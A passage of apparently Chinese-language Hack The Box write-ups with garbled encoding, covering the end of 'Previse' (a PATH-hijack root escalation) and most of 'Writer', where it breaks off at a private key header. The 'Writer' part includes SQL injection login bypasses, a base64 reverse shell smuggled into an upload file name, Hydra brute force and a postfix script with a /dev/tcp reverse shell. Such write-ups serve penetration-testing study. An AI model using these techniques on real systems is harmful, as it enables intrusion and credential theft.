MB\n\nDictionary cache hit:\n* Filename..: /usr/share/wordlists/rockyou.txt\n* Passwords.: 14344385\n* Bytes.....: 139921507\n* Keyspace..: 14344385\n\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# cat 123\n$1$ğŸ§‚llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!\n```\nå¾—åˆ°äº†è´¦å·å¯†ç \n\n```Plain Text\nusername = m4lwhere\npassword = ilovecody112235!\n```\nä½¿ç”¨sshè¿›è¡Œç™»å½•\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# ssh m4lwhere@10.10.11.104\nm4lwhere@10.10.11.104's password:\nWelcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Sun Aug  8 19:21:55 UTC 2021\n\n  System load:  0.4               Processes:           202\n  Usage of /:   49.2% of 4.85GB   Users logged in:     0\n  Memory usage: 20%               IP address for eth0: 10.10.11.104\n  Swap usage:   0%\n\n0 updates can be applied immediately.\n\nLast login: Fri Jun 18 01:09:10 2021 from 10.10.10.5\nm4lwhere@previse:~$ whoami&&id\nm4lwhere\nuid=1000(m4lwhere) gid=1000(m4lwhere) groups=1000(m4lwhere)\n```\n```Plain Text\nm4lwhere@previse:~$ cat user.txt\n29e7b0a44a1b8cc46856e3b43ccdcfa4\n```\næˆåŠŸè·å¾—useræƒé™çš„flag ## æƒé™æå‡ ä½¿ç”¨sudo -læŸ¥çœ‹ä¸€ä¸‹m4lwhereç”¨æˆ·çš„sudoæƒé™\n\n```Plain Text\nm4lwhere@previse:~$ sudo -l\n[sudo] password for m4lwhere:\nUser m4lwhere may run the following commands on previse:\n    (root) /opt/scripts/access_backup.sh\n```\næŸ¥çœ‹ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶\n\n```Plain Text\nm4lwhere@previse:~$ cat /opt/scripts/access_backup.sh\n#!/bin/bash\n\n# We always make sure to store logs, we take security SERIOUSLY here\n\n# I know I shouldnt run this as root but I cant figure it out programmatically on my account\n# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time\n\ngzip -c /var/log/apache2/access.log > /var/backups/$(date --date=\"yesterday\" +%Y%b%d)_access.gz\ngzip -c /var/www/file_access.log > /var/backups/$(date --date=\"yesterday\" +%Y%b%d)_file_access.gz\n```\nææƒ\n\n```Plain Text\ncd /tmp\ncat << EOF > gzip\n> #!/bin/bash\n> cp /bin/bash /tmp/c\n> chmod u+s /tmp/c\n> EOF\nchmod +x gzip\nexport PATH=$( pwd ):$PATH\n\nsudo /opt/scripts/access_backup.sh\n./c -p\n```\n```Plain Text\nc-4.4# whoami&&id\nroot\nuid=1000(m4lwhere) gid=1000(m4lwhere) euid=0(root) groups=1000(m4lwhere)\n```\næˆåŠŸææƒåˆ°rootæƒé™\n\n```Plain Text\nc-4.4# cd /root\nc-4.4# ls\nroot.txt\nc-4.4# cat root.txt\n76a5854ac1f5d8cb5e1079cb1964dacf\n```\næˆåŠŸæ‹¿åˆ°rootæƒé™çš„flag","tags":["Hackthebox"]},{"title":"Writer - Hackthebox","url":"/2021/08/06/Hackthebox/Medium/Hackthebox-Writer/","content":"\n# Hackthebox-Writer\n## é¶åœºä¿¡æ¯\n![](Hackthebox-Writer/image1.png)\n\n## é¶åœºç±»å‹\n![](Hackthebox-Writer/image2.png)\n\n## ä¿¡æ¯æœé›†\nä½¿ç”¨nmapè¿›è¡Œä¿¡æ¯æœé›†\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# nmap -A -sS -sC -sV -p- 10.10.11.101\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-08-05 03:27 CST\nNmap scan report for 10.10.11.101\nHost is up (0.23s latency).\nNot shown: 65531 closed ports\nPORT    STATE SERVICE     VERSION\n22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA)\n|   256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA)\n|_  256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519)\n80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Story Bank | Writer.HTB\n139/tcp open  netbios-ssn Samba smbd 4.6.2\n445/tcp open  netbios-ssn Samba smbd 4.6.2\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=8/5%OT=22%CT=1%CU=34682%PV=Y%DS=2%DC=T%G=Y%TM=610AEB60\nOS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(\nOS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11\nOS:NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(\nOS:R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS\nOS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=\nOS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=\nOS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T\nOS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=\nOS:S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n|_clock-skew: 12m51s\n|_nbstat: NetBIOS name: WRITER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)\n| smb2-security-mode:\n|   2.02:\n|_    Message signing enabled but not required\n| smb2-time:\n|   date: 2021-08-04T19:45:33\n|_  start_date: N/A\n\nTRACEROUTE (using port 5900/tcp)\nHOP RTT       ADDRESS\n1   259.68 ms 10.10.14.1\n2   259.76 ms 10.10.11.101\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 298.54 seconds\n```\nå’±ä»¬å»80ç«¯å£çš„HTTPæœåŠ¡çœ‹ä¸€ä¸‹\n\n![](Hackthebox-Writer/image3.png)\n\nåœ¨äººå·¥æŸ¥çœ‹ä»¥åï¼Œæˆ‘å‘ç°å¹¶æ²¡æœ‰ä»€ä¹ˆçªç ´ï¼Œå’±ä»¬å…ˆåšä¸ªç›®å½•fuzzå§\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -t 100 -u http://10.10.11.101/\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.11.101/\n[+] Method:                  GET\n[+] Threads:                 100\n[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Expanded:                true\n[+] Timeout:                 10s\n===============================================================\n2021/08/05 04:22:00 Starting gobuster in directory enumeration mode\n===============================================================\nhttp://10.10.11.101/about                (Status: 200) [Size: 3522]\nhttp://10.10.11.101/contact              (Status: 200) [Size: 4905]\nhttp://10.10.11.101/static               (Status: 301) [Size: 313] [--> http://10.10.11.101/static/]\nhttp://10.10.11.101/logout               (Status: 302) [Size: 208] [--> http://10.10.11.101/]\nhttp://10.10.11.101/dashboard            (Status: 302) [Size: 208] [--> http://10.10.11.101/]\nhttp://10.10.11.101/administrative       (Status: 200) [Size: 1443]\nhttp://10.10.11.101/server-status        (Status: 403) [Size: 277]\n\n===============================================================\n2021/08/05 04:32:00 Finished\n===============================================================\n```\nå‘ç°æœ‰ä¸€ä¸ª\n\n```Plain Text\nadministratortive\n```\nç›®å½•ï¼Œå’±ä»¬è¿›å…¥æŸ¥çœ‹ä¸€ä¸‹\n\n![](Hackthebox-Writer/image4.png)\n\næ˜¯ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œæˆ‘æµ‹è¯•äº†ä¸€ä¸‹å¼±å£ä»¤ï¼Œå¹¶ä¸å­˜åœ¨\n\nç„¶åç»è¿‡æˆ‘å¤§é‡çš„æµ‹è¯•ä»¥åï¼Œå‘ç°è¿™ä¸ªç™»å½•é¡µé¢å­˜åœ¨Sqlæ³¨å…¥ï¼Œä¸”å¯ç”¨ä¸‡èƒ½å¯†ç è¿›è¡Œç™»å½• ## æ¼æ´åˆ©ç”¨\n\n![](Hackthebox-Writer/image5.png)\n\n![](Hackthebox-Writer/image6.png)\n\nå’±ä»¬å¯¹æ¯”ä¸€ä¸‹è¿™ä¸¤ä¸ªçš„åŒºåˆ«ï¼Œå¯ä»¥å‘ç°\n\n```Plain Text\nadmin'order by 6;--+\n```\næ˜¯æ‰§è¡ŒæˆåŠŸäº†ï¼Œæç¤ºå’±ä»¬\n\n```Plain Text\nWelecome admin\n```\nï¼Œæ‰€ä»¥ç¡®å®šå­˜åœ¨æ³¨å…¥\n\n![](Hackthebox-Writer/image7.png)\n\né€šè¿‡è¿›è¡Œç»†è‡´çš„æ‰‹å·¥æ³¨å…¥åå‘ç°ï¼Œè¯¥æ³¨å…¥ç‚¹ç¬¬äºŒé¡¹å¯è¢«æ˜¾ç¤ºå’±ä»¬åˆ©ç”¨è¿™ä¸ªç‚¹æ¥è¿›è¡Œåˆ©ç”¨\n\n![](Hackthebox-Writer/image8.png)\n\nç»è¿‡å¤§é‡çš„æµ‹è¯•åï¼Œå‘ç°è¯¥æ³¨å…¥ç‚¹å¯ç”¨æ¥è¯»å–æ–‡ä»¶\n\n```Plain Text\n/etc/passwd\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\ntss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false\nuuidd:x:107:112::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:108:113::/nonexistent:/usr/sbin/nologin\nlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin\npollinate:x:110:1::/var/cache/pollinate:/bin/false\nusbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\nsshd:x:112:65534::/run/sshd:/usr/sbin/nologin\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nkyle:x:1000:1000:Kyle Travis:/home/kyle:/bin/bash\nlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\npostfix:x:113:118::/var/spool/postfix:/usr/sbin/nologin\nfilter:x:997:997:Postfix Filters:/var/spool/filter:/bin/sh\njohn:x:1001:1001:,,,:/home/john:/bin/bash\nmysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false\n```\nå’±ä»¬å»ç™»å½•ä¸€ä¸‹åå°çœ‹ä¸€ä¸‹ï¼Œä½¿ç”¨ä¸‡èƒ½å¯†ç \n\n```Plain Text\nusername = admin';--+\npassword = password\n```\nç™»å½•æˆåŠŸ\n\n![](Hackthebox-Writer/image9.png)\n\næˆ‘å‘ç°è¯¥åå°æœ‰ä¸Šä¼ åŠŸèƒ½ï¼Œä¸è¿‡åªèƒ½ä¸Šä¼ å›¾ç‰‡\n\nä¸è¿‡æ²¡æœ‰å…³ç³»ï¼Œå’±ä»¬åˆ¶ä½œä¸€ä¸ªå›¾ç‰‡é©¬å°±å¯ä»¥äº†\n\n```Plain Text\nstep 1\necho -n '/bin/bash -c \"/bin/bash -i >& /dev/tcp/10.10.14.110/9001 0>&1\"' | base64\nå°†åå¼¹shellçš„è¯­å¥è½¬æ¢ä¸ºbase64æ ¼å¼\n\nstep 2\néšä¾¿å‡†å¤‡ä¸€å¼ å›¾ç‰‡ï¼Œæˆ‘è¿™é‡Œå°±ç”¨çš„1.jpg\n\nstep 3\ntouch '1.jpg; `echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTEwLzkwMDEgMD4mMSI=| base64 -d | bash`;'\nå°†å›¾ç‰‡å’Œæœ¨é©¬ç»‘å®šåœ¨ä¸€èµ·ï¼Œç”Ÿæˆä¸€ä¸ªå›¾ç‰‡é©¬çš„æ ¼å¼(ä¸¥æ ¼æ„ä¹‰ä¸Šè¯´ä¸æ˜¯å›¾ç‰‡é©¬ï¼Œæ¯•ç«Ÿåªæ˜¯ä¸€ä¸ªåç¼€ç»•è¿‡)\n\nstep 4\nfile:///var/www/writer.htb/writer/static/img/1.jpg; `echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTEwLzkwMDEgMD4mMSI=| base64 -d | bash`;#\nä¸Šä¼ çš„æ—¶å€™æ‰€ä½¿ç”¨çš„æ‰§è¡Œè¯­å¥\n\nstep 5\nnc -nvlp 9001\nä½¿ç”¨ncç›‘å¬ç«¯å£\n```\nä¸Šé¢æ˜¯ä¸€ä¸ªå¤§è‡´çš„åˆ©ç”¨æ­¥éª¤ï¼Œå’±ä»¬ç°åœ¨æ¥è¯¦ç»†è¿›è¡Œåˆ©ç”¨\n\né¦–å…ˆå‰ä¸‰æ­¥ç”Ÿæˆå›¾ç‰‡é©¬å°±ä¸è¯´äº†ï¼Œç¨å¾®ä¿®æ”¹ä¸€ä¸‹æŒ‡ä»¤ç„¶åè¾“å…¥å³å¯\n\nåœ¨è¿›å…¥ç¬¬å››æ­¥ä¹‹å‰ï¼Œå’±ä»¬éœ€è¦å…ˆç™»å…¥åå°\n\n![](Hackthebox-Writer/image10.png)\n\nç„¶åä¿®æ”¹ä¸€ç¯‡æ–‡ç« \n\n![](Hackthebox-Writer/image11.png)\n\nä¿®æ”¹è¿‡ç¨‹ä¸­ç„¶åä¸Šä¼ æˆ‘ä»¬åˆ¶ä½œçš„æœ¨é©¬\n\n![](Hackthebox-Writer/image12.png)\n\nç„¶åæˆ‘ä»¬ä½¿ç”¨burpè¿›è¡ŒæŠ“åŒ…ï¼Œç„¶åå†è¿›è¡Œä¿®æ”¹\n\nä¿®æ”¹åä»¥åï¼Œä½¿ç”¨ncç›‘å¬æˆ‘ä»¬æŒ‡å®šçš„ç«¯å£ï¼Œç„¶åæ‰§è¡Œæµé‡åŒ…å³å¯\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# nc -nvlp 9001\nlistening on [any] 9001 ...\nconnect to [10.10.14.110] from (UNKNOWN) [10.10.11.101] 48906\nbash: cannot set terminal process group (1061): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@writer:/$ whoami&&id\nwhoami&&id\nwww-data\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\næˆåŠŸè·å¾—ä¸€ä¸ªwww-dataæƒé™çš„shell\n\nè‡³äºä¸Šé¢ç”¨åˆ°çš„å›¾ç‰‡çš„è·¯å¾„æ€ä¹ˆå¾—æ¥çš„ï¼Œå’±ä»¬åœ¨ä¹‹å‰çˆ†ç ´çš„æ—¶å€™è·å¾—äº†ä¸€ä¸ª`/static`è·¯å¾„ï¼Œè¿›å…¥åå‘ç°å¯ä»¥ç›®å½•éå†\n\n```Plain Text\nhttp://10.10.11.101/static/img/\n```\nå’±ä»¬åœ¨è¿™ä¸ªè·¯å¾„å³å¯çœ‹åˆ°æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ï¼Œå†åˆ©ç”¨sqlæ³¨å…¥å¤„çš„æ–‡ä»¶è¯»å–è¯»å–é…ç½®æ–‡ä»¶ï¼Œå³å¯çŸ¥é“ç»å¯¹è·¯å¾„\n\næš‚æ—¶åœ¨è¿™åˆå¡å£³äº†ï¼ŒæŸ¥çœ‹ä¸€ä¸‹homeç›®å½•\n\n```Plain Text\nwww-data@writer:/home$ ls\nls\njohn  kyle\n```\nè¿™é‡Œæœ‰ä¸¤ä¸ªæ€è·¯\n\n1. ä½¿ç”¨hydraçˆ†ç ´kyleçš„å¯†ç \n2. è¯»å–mysqlçš„é…ç½®ï¼Œç›´æ¥è¿›æ•°æ®åº“æ‹¿kyleçš„hash\n\nå’±ä»¬å…ˆæ¥çœ‹çœ‹ç¬¬ä¸€ä¸ªï¼Œhydraçˆ†ç ´å¯†ç \n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# hydra -l kyle -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt 10.10.11.101 ssh\nHydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-05 05:16:18\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 9437 login tries (l:1/p:9437), ~590 tries per task\n[DATA] attacking ssh://10.10.11.101:22/\n[STATUS] 121.00 tries/min, 121 tries in 00:01h, 9318 to do in 01:18h, 16 active\n[STATUS] 112.33 tries/min, 337 tries in 00:03h, 9102 to do in 01:22h, 16 active\n[STATUS] 99.71 tries/min, 698 tries in 00:07h, 8741 to do in 01:28h, 16 active\n[STATUS] 97.27 tries/min, 1459 tries in 00:15h, 7980 to do in 01:23h, 16 active\n[STATUS] 96.23 tries/min, 2983 tries in 00:31h, 6456 to do in 01:08h, 16 active\n[STATUS] 96.04 tries/min, 4514 tries in 00:47h, 4925 to do in 00:52h, 16 active\n[STATUS] 95.70 tries/min, 6029 tries in 01:03h, 3410 to do in 00:36h, 16 active\n[STATUS] 95.49 tries/min, 7544 tries in 01:19h, 1895 to do in 00:20h, 16 active\n[STATUS] 95.18 tries/min, 9042 tries in 01:35h, 397 to do in 00:05h, 16 active\n[22][ssh] host: 10.10.11.101   login: kyle   password: marcoantonio\n1 of 1 target successfully completed, 1 valid password found\n[WARNING] Writing restore file because 2 final worker threads did not complete until end.\n[ERROR] 2 targets did not resolve or could not be connected\n[ERROR] 0 target did not complete\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-05 06:55:10\n```\nç„¶åæ˜¯ç¬¬äºŒä¸ªï¼Œè¿›å…¥æ•°æ®åº“æ‹¿kyleçš„hash\n\n```Plain Text\nwww-data@writer:/$ cd /etc/mysql\ncd /etc/mysql\nwww-data@writer:/etc/mysql$ ls\nls\nconf.d\ndebian-start\ndebian.cnf\nmariadb.cnf\nmariadb.conf.d\nmy.cnf\nmy.cnf.fallback\nwww-data@writer:/etc/mysql$ cat mariadb.cnf\ncat mariadb.cnf\n# The MariaDB configuration file\n#\n# The MariaDB/MySQL tools read configuration files in the following order:\n# 1. \"/etc/mysql/mariadb.cnf\" (this file) to set global defaults,\n# 2. \"/etc/mysql/conf.d/*.cnf\" to set global options.\n# 3. \"/etc/mysql/mariadb.conf.d/*.cnf\" to set MariaDB-only options.\n# 4. \"~/.my.cnf\" to set user-specific options.\n#\n# If the same option is defined multiple times, the last one will apply.\n#\n# One can use all long options that the program supports.\n# Run program with --help to get a list of available options and with\n# --print-defaults to see which it would actually understand and use.\n\n#\n# This group is read both both by the client and the server\n# use it for options that affect everything\n#\n[client-server]\n\n# Import all .cnf files from configuration directory\n!includedir /etc/mysql/conf.d/\n!includedir /etc/mysql/mariadb.conf.d/\n\n[client]\ndatabase = dev\nuser = djangouser\npassword = DjangoSuperPassword\ndefault-character-set = utf8\n```\næ‹¿åˆ°mysqlæ•°æ®åº“è´¦å·å¯†ç ï¼Œè¿›å…¥æ•°æ®åº“æ‹¿kyleç”¨æˆ·çš„hashå€¼\n\n```Plain Text\nwww-data@writer:/etc/mysql$ mysql -u djangouser -h 127.0.0.1 -p\nmysql -u djangouser -h 127.0.0.1 -p\nEnter password: DjangoSuperPassword\n\nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\n\nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MariaDB connection id is 1508\nServer version: 10.3.29-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04\n\nCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nMariaDB [dev]> show databases;\nshow databases;\n+--------------------+\n| Database           |\n+--------------------+\n| dev                |\n| information_schema |\n+--------------------+\n2 rows in set (0.001 sec)\n\nMariaDB [dev]> use dev;\nuse dev;\nDatabase changed\nMariaDB [dev]> show tables;\nshow tables;\n+----------------------------+\n| Tables_in_dev              |\n+----------------------------+\n| auth_group                 |\n| auth_group_permissions     |\n| auth_permission            |\n| auth_user                  |\n| auth_user_groups           |\n| auth_user_user_permissions |\n| django_admin_log           |\n| django_content_type        |\n| django_migrations          |\n| django_session             |\n+----------------------------+\n10 rows in set (0.000 sec)\n\nMariaDB [dev]> SELECT * FROM auth_user;\nSELECT * FROM auth_user;\n+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+\n| id | password                                                                                 | last_login | is_superuser | username | first_name | last_name | email           | is_staff | is_active | date_joined                |\n+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+\n|  1 | pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A= | NULL       |            1 | kyle     |            |           | kyle@writer.htb |        1 |         1 | 2021-05-19 12:41:37.168368 |\n+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+\n1 row in set (0.000 sec)\n```\næˆåŠŸå¾—åˆ°hashå€¼\n\n```Plain Text\npbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=\n```\nç„¶åä¿å­˜åˆ°æœ¬åœ°æ–‡ä»¶\n\nä½¿ç”¨johnæˆ–è€…hashcatè¿›è¡Œçˆ†ç ´å³å¯\n\n```Plain Text\nhashcat -a 0 -m 10000 hash --wordlist /usr/share/wordlists/rockyou.txt\n```\næˆåŠŸå¾—åˆ°ç”¨æˆ·kyleçš„è´¦å·å¯†ç \n\n```Plain Text\nusername = kyle\npassword = marcoantonio\n```\nå’±ä»¬ä½¿ç”¨sshè¿›è¡Œç™»å½•\n\n```Plain Text\nkyle@writer:~$ cat user.txt\n70dc74ad2b72d9bf163b98822d6222a9\n```\næˆåŠŸè·å¾—useræƒé™çš„flag ## æƒé™æå‡ å’±ä»¬å‡†å¤‡ä¸¤ä¸ªè„šæœ¬\n\n```Plain Text\n#!/bin/bash\n# Localize these.\nbash -i &>/dev/tcp/10.10.14.110/4444 0>&1\nINSPECT_DIR=/var/spool/filter\nSENDMAIL=/usr/sbin/sendmail\n\n# Get disclaimer addresses\nDISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses\n\n# Exit codes from <sysexits.h>\nEX_TEMPFAIL=75\nEX_UNAVAILABLE=69\n\n# Clean up when done or when aborting.\ntrap \"rm -f in.$$\" 0 1 2 3 15\n\n# Start processing.\ncd $INSPECT_DIR || { echo $INSPECT_DIR does not exist; exit\n$EX_TEMPFAIL; }\n\ncat >in.$$ || { echo Cannot save mail to file; exit $EX_TEMPFAIL; }\n\n# obtain From address\nfrom_address=`grep -m 1 \"From:\" in.$$ | cut -d \"<\" -f 2 | cut -d \">\" -f 1`\n\nif [ `grep -wi ^${from_address}$ ${DISCLAIMER_ADDRESSES}` ]; then\n  /usr/bin/altermime --input=in.$$ \\\n                   --disclaimer=/etc/postfix/disclaimer.txt \\\n                   --disclaimer-html=/etc/postfix/disclaimer.txt \\\n                   --xheader=\"X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm\" || \\\n                    { echo Message content rejected; exit $EX_UNAVAILABLE; }\nfi\n\n$SENDMAIL \"$@\" <in.$$\n\nexit $?\n```\nè¿™æ˜¯ä¿®æ”¹åŸæ–‡ä»¶`/etc/postfix/disclaimer`åå¾—åˆ°çš„è„šæœ¬ï¼Œè¿™é‡Œåªæ˜¯ä¸¾ä¸ªä¾‹å­ï¼Œè¯¥é¶æœºæ— æ³•ä½¿ç”¨bashå’Œshè¿›è¡Œåå¼¹shellã€‚å¯ä»¥ä½¿ç”¨pythonæˆ–socatè¿›è¡Œgetshellï¼Œç”±äºæ‡’ï¼Œæˆ‘å°±ä¸ä¿®æ”¹äº†\n\næŸ¥çœ‹æ–‡ä»¶`/etc/postfix/disclaimer_addresses`å¾—åˆ°é‚®ç®±`kyle@writer.htb`\n\nä½¿ç”¨è¯¥é‚®ç®±ç¼–å†™è„šæœ¬\n\n```Plain Text\nimport smtplib\nhost = '127.0.0.1'\nport = 25\n\nsender_email = \"kyle@writer.htb\"\nreceiver_email = \"kyle@writer.htb\"\nmessage = \"\"\"\\\nSubject: Hi there\n\nTest_python_sender.\"\"\"\n\ntry:\n    server = smtplib.SMTP(host, port)\n    server.ehlo()\n    server.sendmail(sender_email, receiver_email, message)\nexcept Exception as e:\n    print(e)\nfinally:\n    server.quit()\n```\nè¿™æ˜¯å‘é€é‚®ä»¶çš„è„šæœ¬\n\nä¸Šä¼ åˆ°æœåŠ¡å™¨\n\nç„¶åä½¿ç”¨ncç›‘å¬ç«¯å£\n\n```Plain Text\nnc -nvlp 4444\n```\næ‹·è´disclaimeræ–‡ä»¶å¹¶å‘é€é‚®ä»¶\n\n```Plain Text\ncp disclaimer /etc/postfix/disclaimer && python3 sendmail.py\n```\næˆåŠŸå¾—åˆ°johnçš„shell\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.110] from (UNKNOWN) [10.10.11.101] 44352\nbash: cannot set terminal process group (78664): Inappropriate ioctl for device\nbash: no job control in this shell\njohn@writer:/var/spool/postfix$ whoami&&id\nwhoami&&id\njohn\nuid=1001(john) gid=1001(john) groups=1001(john)\n```\nå¾—åˆ°johnçš„æƒé™ï¼Œåœ¨`/home/john/.ssh/`ç›®å½•ä¸‹æ‹¿åˆ°`id_rsa`æ–‡ä»¶ï¼Œä¿å­˜åˆ°æœ¬åœ°\n\n```Plain Text\n-----BEGIN OPENSSH PRIVATE 